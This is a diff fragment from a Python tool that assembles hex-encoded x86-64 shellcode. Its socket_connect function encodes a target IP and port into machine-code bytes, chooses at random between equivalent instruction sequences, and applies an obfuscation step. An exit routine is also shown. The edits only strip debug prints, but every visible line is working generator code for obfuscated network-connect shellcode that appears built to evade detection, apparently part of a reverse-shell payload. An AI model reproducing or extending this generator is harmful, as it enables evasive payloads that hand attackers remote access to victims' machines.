@@ -215,30 +215,21 @@ def socket_connect(ip, port):
     for i in range(0,len(ip_greater)):
         if ip_greater[i] < 17: PAYLOAD += "0"
         PAYLOAD += hex(ip_greater[i])[:2]
-        # print(hex(ip_greater[i])[2:])
 
 
     add_string += "83ee" # sub esi
     for i in range(0, len(ip_to_substract)):
         if ip_to_substract[i] < 17: PAYLOAD += "0"
         PAYLOAD += hex(ip_to_substract[i])[:2]
-       # print(hex(ip_to_substract[i])[2:])
 
-    #print(PAYLOAD)
-    #port = hex(socket.htons(int(port)))[:2]
     port = hex(socket.htons(int(port)))
-    print("0 :",port)
 
     add_string += "566668" # push
-    print("1 :",add_string, port)
     add_string += str(port[-4:])  
-    print("2 :",add_string, port)
     add_string += "666a02" #AF_INET
     add_string += "4889e6" if r(0,1) else "4831f64801e6" # "mov rsi, rsp" "xor rsi, rsi ; add rsi, rsp"
     add_string += "b218" # mov dl,24
     add_string += call()
-
-    print("3 :",add_string)
 
     #Offuscation
     random1 = factorOffus(add_string)
@@ -324,7 +315,6 @@ def _exit():
     PAYLOAD+=clean("rdx")
     PAYLOAD+="b03c"
     PAYLOAD +='4c89d7'
-   # print(PAYLOAD)
     PAYLOAD += call()
 
 
